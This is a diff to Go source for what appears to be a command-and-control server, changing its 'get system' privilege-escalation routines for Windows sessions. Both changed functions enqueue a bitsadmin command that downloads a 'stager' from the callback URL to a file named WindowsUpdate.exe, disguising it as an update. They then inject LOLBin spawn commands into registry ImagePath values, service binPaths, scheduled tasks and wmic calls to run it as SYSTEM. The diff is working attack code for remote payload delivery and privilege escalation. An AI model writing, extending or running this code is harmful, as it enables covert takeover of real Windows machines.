@@ -2718,31 +2718,115 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 
 			// Generate spawn command using LOLBins
 			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
+			// Escape % signs in spawnCmd so fmt.Sprintf doesn't interpret them
+			spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
 
 			// Execute method commands with proper timing and error checking
 			commandFailed := false
 			for idx, cmdTemplate := range method.Commands {
-				// Properly escape spawnCmd based on command type to avoid nested quote issues
+				// Detect what type of command this is and handle accordingly
 				var cmd string
-				if strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) {
+				
+				// Check if this is a copy command that needs a file path
+				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) && 
+					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
+					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
+				
+				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%%`)
+				
+				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
+				
+				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))
+				
+				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)
+				
+				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath
+				
+				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
+				
+				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
+				
+				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)
+				
+				if isCopyCommand {
+					// For copy commands, we need to download the file first, then copy it
+					// Check if we've already downloaded the file (look for previous download command)
+					// If this is the first copy command in the sequence, download first
+					hasDownloaded := false
+					for j := 0; j < idx; j++ {
+						if strings.Contains(method.Commands[j], `bitsadmin`) || strings.Contains(method.Commands[j], `download`) {
+							hasDownloaded = true
+							break
+						}
+					}
+					
+					if !hasDownloaded {
+						// First copy command - download the file first
+						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						// Download the file
+						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
+						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+						downloadTask := &tasks.Task{
+							ID:         downloadTaskID,
+							Type:       "shell",
+							Command:    downloadCmd,
+							Parameters: map[string]interface{}{"session_id": sessionID},
+						}
+						is.server.EnqueueTask(downloadTask)
+						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
+					}
+					
+					// Now use the file path for the copy command
+					filePath := `%%TEMP%%\WindowsUpdate.exe`
+					// Extract destination from template
+					cmd = fmt.Sprintf(cmdTemplate, filePath)
+				} else if isDelCommand {
+					// For del commands, use file path
+					filePath := strings.ReplaceAll(`%%TEMP%%\WindowsUpdate.exe`, `%`, `%%`)
+					// Replace %s with file path, but also handle %WINDIR% cases
+					if strings.Contains(cmdTemplate, `%%WINDIR%%`) {
+						// Extract the filename from the template
+						cmd = strings.ReplaceAll(cmdTemplate, `%s`, filePath)
+					} else {
+						cmd = fmt.Sprintf(cmdTemplate, filePath)
+					}
+				} else if isSchTasksTr {
+					// For schtasks /tr, we need to wrap in cmd.exe /c and escape quotes
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					// Escape quotes for nested command
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isSchTasksXml {
+					// XML manipulation - this actually needs a file path to XML file, not a command
+					// Skip this method for now as it's not properly implemented
+					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
+					commandFailed = true
+					break
+				} else if isRegAddD {
 					// For reg add /d, we need to escape quotes
-					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
-				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
-					// For schtasks /tr, we need to escape quotes
-					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+				} else if isRegImagePath {
+					// For reg add ImagePath, wrap in cmd.exe /c
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
-				} else if strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`) {
-					// For schtasks /change /tr, we need to escape quotes
-					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
+				} else if isScCreate || isScConfig {
+					// For sc create/config binPath=, we need to escape quotes and wrap in cmd.exe /c
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
-				} else if strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`) {
-					// For sc binPath=, we need to escape quotes
-					escapedCmd := strings.ReplaceAll(spawnCmd, `"`, `\"`)
-					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isWmic {
+					// For wmic, wrap in cmd.exe /c
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
 				} else {
-					// For other commands, use spawnCmd as-is
-					cmd = fmt.Sprintf(cmdTemplate, spawnCmd)
+					// For other commands, use spawnCmd as-is (already escaped)
+					cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
 				}
 
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
@@ -3147,11 +3231,100 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 
 			// Generate spawn command using LOLBins
 			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "system")
+			// Escape % signs in spawnCmd so fmt.Sprintf doesn't interpret them
+			spawnCmdEscaped := strings.ReplaceAll(spawnCmd, `%`, `%%`)
 
 			// Execute method commands with proper timing and error checking
 			commandFailed := false
 			for idx, cmdTemplate := range method.Commands {
-				cmd := fmt.Sprintf(cmdTemplate, spawnCmd)
+				// Detect what type of command this is and handle accordingly
+				var cmd string
+				
+				// Check if this is a copy command that needs a file path
+				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) && 
+					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
+					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
+				
+				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%%`)
+				
+				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
+				
+				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))
+				
+				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)
+				
+				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath
+				
+				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
+				
+				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
+				
+				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)
+				
+				if isCopyCommand {
+					// For copy commands, we need to download the file first, then copy it
+					hasDownloaded := false
+					for j := 0; j < idx; j++ {
+						if strings.Contains(method.Commands[j], `bitsadmin`) || strings.Contains(method.Commands[j], `download`) {
+							hasDownloaded = true
+							break
+						}
+					}
+					
+					if !hasDownloaded {
+						// First copy command - download the file first
+						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
+						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+						downloadTask := &tasks.Task{
+							ID:         downloadTaskID,
+							Type:       "shell",
+							Command:    downloadCmd,
+							Parameters: map[string]interface{}{"session_id": sessionID},
+						}
+						is.server.EnqueueTask(downloadTask)
+						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
+					}
+					
+					filePath := `%%TEMP%%\WindowsUpdate.exe`
+					cmd = fmt.Sprintf(cmdTemplate, filePath)
+				} else if isDelCommand {
+					// For del commands, use template as-is (no %s placeholder)
+					if strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `Program Files`) {
+						cmd = cmdTemplate // Template already has correct path
+					} else {
+						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						cmd = fmt.Sprintf(cmdTemplate, filePath)
+					}
+				} else if isSchTasksTr {
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isSchTasksXml {
+					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
+					commandFailed = true
+					break
+				} else if isRegAddD {
+					escapedCmd := strings.ReplaceAll(spawnCmdEscaped, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isRegImagePath {
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isScCreate || isScConfig {
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
+					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
+				} else if isWmic {
+					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
+					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
+					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
+				} else {
+					cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
+				}
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 				task := &tasks.Task{
 					ID:         taskID,
